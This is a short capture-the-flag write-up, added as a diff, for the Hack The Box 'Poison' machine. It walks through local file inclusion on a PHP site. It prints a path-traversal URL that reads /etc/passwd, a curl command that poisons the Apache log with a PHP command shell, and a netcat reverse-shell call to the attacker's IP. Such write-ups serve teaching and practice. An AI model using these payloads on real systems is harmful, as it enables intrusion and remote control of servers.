@@ -1,0 +1,34 @@
+#Hack The Box: "Poison" Challenge Writeup
+#Objective:
+
+The task was to exploit a vulnerable LFI (Local File Inclusion) vulnerability on a web application and escalate privileges to root.
+
+#Step 1: Identifying the LFI Vulnerability
+
+    -Scanned the website and found a vulnerable file inclusion path:
+
+    'bash
+    'http://<target_ip>/index.php?page=../../../../etc/passwd
+
+    -Accessed sensitive system files like /etc/passwd.
+
+#Step 2: Exploiting LFI for Remote Code Execution
+
+    -Used the LFI to read the Apache logs and inject a reverse shell by modifying the user-agent:
+    
+    'bash
+    'curl -A "<?php system($_GET['cmd']); ?>" http://<target_ip>/index.php?page=../../../../var/log/apache2/access.log
+
+ -Executed the reverse shell:
+
+    'bash
+    'http://<target_ip>/index.php?page=../../../../var/log/apache2/access.log&cmd=nc -e /bin/sh <your_ip> <your_port>
+
+#Step 3: Privilege Escalation
+
+    -After gaining a low-privileged shell, exploited a SUID binary on the system to gain root access.
+
+#Lessons Learned:
+
+    -LFI vulnerabilities can lead to severe consequences, including full system compromise if misconfigured.
+    -It’s crucial to properly sanitize file paths in web applications.
